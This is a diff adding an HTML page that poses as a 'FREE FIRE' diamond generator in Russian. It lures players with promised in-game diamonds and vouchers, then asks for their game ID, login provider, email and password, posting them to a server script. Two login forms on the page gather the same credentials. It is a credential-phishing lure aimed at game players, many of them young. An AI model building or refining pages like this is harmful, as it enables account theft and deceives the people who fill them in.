@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <a href="http://127.0.0.1.1:5500/index.html"></a>
+    <link rel="stylesheet" href="css/style.css">
+    <title>Document</title>
+</head>
+<body>  
+
+  <script>
+      var modal = document.getElementById('id01');
+
+      window.onclick = function(event) {
+        if (event.target == modal) {
+          modal.style.display = "none";
+        }
+      }
+  </script>
+  
+  <div class="get">
+
+    <div class="section">
+        <div class="containert">
+            <div class="wuwu">
+                <div class="poto">
+                    <h1 class="ph" >"FREE FIRE" Накрутка алмазы</h1>
+                    <h3 class="d" >Выбери одну из них</h3>
+                    <img class="dpg" src="photo/2.jpg" alt="">
+                    <img class="spg" src="photo/3.pg.jpeg" alt="">
+
+                </div>
+                <div class="dic">
+                    <input class="tu" name="vopros1" value="no" id="value1" type="radio" >
+                    <input class="wan" name="vopros1" value="no" id="value2" type="radio">
+                </div>
+            </div>    
+            <div class="tutu">
+                <div class="ptoho">
+                    <h3 class="s" >Выбери одну из них</h3>
+                    <img class="apg" src="photo/4pg.jpg" alt="">
+                    <img class="lpg" src="photo/5.pg.jpg" alt="">
+
+                </div>
+                <div class="f">
+                    <input class="tw" name="vopros2" value="no" id="value1" type="radio" >
+                    <input class="vam" name="vopros2" value="no" id="value2" type="radio">
+                </div>
+            </div>    
+            <div class="eueu">
+                <div class="pgoto">
+                    <h3>Алмазы</h3>
+                    <input class="tvt" name="vopros3" value="no" id="value1" type="radio"> 100<br>  
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 200<br>
+                    <input class="tvt" name="vopros3" value="no" id="value1" type="radio"> 300<br>  
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 400<br>
+                    <input class="tvt" name="vopros3" value="no" id="value1" type="radio"> 500<br>  
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 600<br>
+                    <input class="tvt" name="vopros3" value="no" id="value1" type="radio"> 700<br>  
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 800<br>
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 900<br>
+                    <input class="vav" name="vopros3" value="no" id="value2" type="radio"> 1000<br>
+                    <input class="var" name="vopros4" value="no" id="value2" type="radio"> Ваучер на неделю<br>
+                    <input class="vav" name="vopros4" value="no" id="value2" type="radio"> Ваучер на месяц<br>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <form class="action" action="action_page.php" method="post">
+        <div class="imgcontainer">
+          <img src="photo/6.pg.png" alt="Avatar" class="avatar">
+        </div>
+      
+        <div class="containers">
+          <label for="u"><b>FREE FIRE: ID</b></label>
+          <input type="text" placeholder="0000000000" name="uname" required>
+          
+          <h3 class="vhod ">Вход через:</h3>
+          <div class="facebook">
+          <input class="vav" name="vopros7" value="no" id="value2" type="radio" > FACEBOOK<br>
+          <input class="vav" name="vopros7" value="no" id="value2" type="radio"> GOOGLE<br>
+          <input class="vav" name="vopros7" value="no" id="value2" type="radio"> VK<br>
+        </div>
+          <label for="uname"><b>Email</b></label>
+          <input type="text" placeholder="Enter Email" name="uname" required>
+      
+          <label for="psw"><b>Password</b></label>
+          <input type="password" placeholder="Enter Password" name="psw" required>
+      
+          <button type="submit">Login</button>
+          <label>
+            <input type="checkbox" checked="checked" name="remember">
+          </label>
+        </div>
+      
+        <div class="container" style="background-color:#f1f1f1">
+          <button type="button"  class="cancelbtn"><a href="http://127.0.0.1:5500/index.html" class="cancelbtn">Cancel</a></button>
+          <span class="psw">Forgot <a href="https://accounts.google.com/signin/v2/identifier?hl=ru&continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fsxsrf%3DAPq-WBt7bE-XFbSYf4GS-0f9HlmozBoOzA%3A1646553507843%26q%3D%25D0%2592%25D1%2585%25D0%25BE%25D0%25B4%2B%25D0%25B2%2B%25D0%25B0%25D0%25BA%25D0%25BA%25D0%25B0%25D1%2583%25D0%25BD%25D1%2582%26sa%3DX%26ved%3D2ahUKEwik1MDngbH2AhWXzosKHQrlDJQQ1QJ6BAgeEAE%26biw%3D1388%26bih%3D678%26dpr%3D1.38&ec=GAlAAQ&flowName=GlifWebSignIn&flowEntry=AddSession">password?</a></span>
+        </div>
+      </form>
+    
+      <button onclick="document.getElementById('id01').style.display='block'" class="log">Login</button>
+    
+    <div id="id01" class="modal">
+      <span onclick="document.getElementById('id01').style.display='none'"
+    class="close" title="Close Modal">&times;</span>
+    
+      <form class="modal-content animate" action="/action_page.php">
+        <div class="imgcontainer">
+        </div>
+    
+        <div class="containers">
+          <label for="uname"><b>Email</b></label>
+          <input type="text" placeholder="Enter Username" name="uname" required>
+    
+          <label for="psw"><b>Password</b></label>
+          <input type="password" placeholder="Enter Password" name="psw" required>
+    
+          <button type="submit"><a>login</a></button>
+
+          <label>
+            <input type="checkbox" checked="checked" name="remember">
+          </label>
+        </div>
+    
+        <div class="container" style="background-color:#f1f1f1">
+          <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancel</button>
+          <span class="psw">Forgot <a href="https://accounts.google.com/signin/v2/identifier?hl=ru&continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fsxsrf%3DAPq-WBt7bE-XFbSYf4GS-0f9HlmozBoOzA%3A1646553507843%26q%3D%25D0%2592%25D1%2585%25D0%25BE%25D0%25B4%2B%25D0%25B2%2B%25D0%25B0%25D0%25BA%25D0%25BA%25D0%25B0%25D1%2583%25D0%25BD%25D1%2582%26sa%3DX%26ved%3D2ahUKEwik1MDngbH2AhWXzosKHQrlDJQQ1QJ6BAgeEAE%26biw%3D1388%26bih%3D678%26dpr%3D1.38&ec=GAlAAQ&flowName=GlifWebSignIn&flowEntry=AddSession">password?</a></span>
+        </div>
+      </form>
+    </div>
+
+  </div>
+
+
+    <script src="js/main.js"></script>
+</body>
+</html>
